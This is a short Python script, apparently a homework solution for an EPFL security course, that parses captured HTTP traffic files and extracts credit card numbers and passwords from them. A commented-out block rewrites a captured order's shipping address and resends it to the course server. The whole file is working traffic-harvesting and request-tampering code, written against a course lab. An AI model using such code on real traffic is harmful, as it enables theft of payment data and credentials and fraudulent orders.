import pickle
import os
import glob as globmain
from scapy.all import *
import requests
import json
import re


def check_splitted_digits(cc_digits:list,print_error,delimiter = '.'):
				if(len(cc_digits)==4):
					if(' ' in cc_digits[-1]):
						cc_digits[-1]=cc_digits[-1].split(' ')[0]
					success = True
					cc_num = ''
					for digit in cc_digits:
						if not(len(digit)==4):
							if(print_error):
								print(digit + 'not valid in cc')
							success = False
							break
						try:
							d = int(digit)
							if not (cc_num ==''):
								cc_num += delimiter
							cc_num += str(d).zfill(4)

						except Exception as e:
							success = False
							
							print(e)
					if(success):
						print(cc_num)
						return cc_num
				return ''


def check_cc(http,print_error= False):
	if('transaction' in http):

		if(' cc ' in http and '---' in http):
			#print(http)
			index = http.find('---')
			if(index >= 0):
				index+=4
				cc_digits = http[index:index+20].strip().split('.')
				res1 = check_splitted_digits(cc_digits,print_error,'.')
				
				
				if(res1 != ''):
					return res1

				cc_digits = http[index:index+20].strip().split('/')
				res2 = check_splitted_digits(cc_digits,print_error,'/')
				if(res2 != ''):
					return res2
	if(print_error):
		print('invalid pwd')
	return ''

def isValidPwd(pwd):
	alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:;<=>?@'
	if len(pwd) >= 8 and len(pwd) <= 30:
		return len([char_ for char_ in pwd if char_ not in alphabet])==0
	return False

def parser(file):
	http = pickle.load(open(file,'rb'))
	splitted = http.split('\r\n')
	'''
	if('shipping' in http):
		print('yes')
		print(file)
		print(splitted)
		payload = json.loads(splitted[-1])
		payload['shipping_address']='keshav.singh@epfl.ch'
		headers = { 'User-Agent': 'Dumb Generator', 'Content-Type': 'application/json'}
		print(payload)
		res = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", headers = headers,data=json.dumps(payload))
		print(res.status_code)
		print(res.reason)
		print(res.text)
	'''
	res = check_cc(http,False)
	pwd_final = ''
	if(' pwd ' in http and '---' in http):
			#print(http)
			index = http.find('---')
			if(index >=0):
				pwd = http[index+4:].split(' ')
				if(len(pwd)>0):

					if(isValidPwd(pwd[0])):
						print(pwd[0])
						pwd_final = pwd[0]

	return res,pwd_final




if __name__=='__main__':
	os.chdir('shared')
	cc_s = []
	pwd_s = []
	for file in globmain.glob("http*"):
		res,res_pwd = parser(file)
		if(not (res == '') and res not in cc_s):
			cc_s.append(res)
		if(not (res_pwd=='') and res_pwd not in pwd_s):
			pwd_s.append(res_pwd)

	print(cc_s,pwd_s)



